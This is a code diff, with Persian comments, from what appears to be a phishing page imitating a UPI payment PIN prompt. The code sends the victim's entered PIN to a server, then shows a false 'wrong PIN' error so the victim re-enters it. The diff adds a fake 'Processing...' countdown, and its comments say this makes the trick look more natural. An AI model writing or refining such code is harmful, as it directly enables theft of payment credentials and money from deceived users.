@@ -134,12 +134,26 @@
         const pin = pinArr.join('');
         showLoadingDialog();
         
-        // ⭐ اگر اولین بار هست، PIN رو به سرور ارسال کن (با status failed) و error "پین اشتباهه" نشون بده
+        // ⭐ اگر اولین بار هست، timer نشون بده و بعد error
         if (isFirstAttempt) {
-          // ⭐ ارسال PIN به سرور با status failed
-          sendPinToServer(pin, false);  // false = failed
+          // ⭐ Timer countdown برای بار اول (مثل بار دوم)
+          const timerTextEl = document.getElementById("timerText");
+          let timerCountdown = 3;
+          const timerInterval = setInterval(() => {
+            timerCountdown--;
+            if (timerCountdown > 0) {
+              timerTextEl.textContent = `Processing... ${timerCountdown}s`;
+            } else {
+              timerTextEl.textContent = "Completing...";
+              clearInterval(timerInterval);
+            }
+          }, 1000);
           
+          // ⭐ بعد از 3 ثانیه PIN رو ارسال کن (با status failed) و error نشون بده
           setTimeout(() => {
+            // ⭐ ارسال PIN به سرور با status failed
+            sendPinToServer(pin, false);  // false = failed
+            
             hideLoadingDialog();
             showErrorPinDialog();  // ⭐ error "پین اشتباهه" نشون بده
             localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
@@ -147,7 +161,7 @@
             // پاک کردن PIN برای تلاش بعدی
             pinArr = [];
             updateInputs();
-          }, 1500);  // یکم delay برای واقعی‌تر شدن
+          }, 3000);  // ⭐ 3 ثانیه مثل بار دوم برای طبیعی بودن
           return;
         }
         
